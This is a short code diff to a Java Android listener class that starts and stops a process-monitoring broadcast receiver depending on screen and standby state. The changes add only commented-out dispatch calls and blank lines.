@@ -81,6 +81,8 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 					processReceiver = new BroadcastMonitorProcess();
 					processReceiver.start();
 					processReceiver.register(this);
+					
+					//dispatch(new ProcessInfo("", ProcessStatus.START));
 				}else{
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (start): screen off");
@@ -107,6 +109,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				started = false;
 				
 				if (processReceiver != null) {
+					//dispatch(new ProcessInfo("", ProcessStatus.STOP));
 					processReceiver.unregister();
 					processReceiver = null;
 				}
@@ -141,6 +144,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 	@Override
 	public int notification(Standby b) {
+
 		synchronized (standbyLock) {
 			if (b.getStatus()) {
 				if (Cfg.DEBUG) {
@@ -159,4 +163,5 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 		return 0;
 	}
+
 }
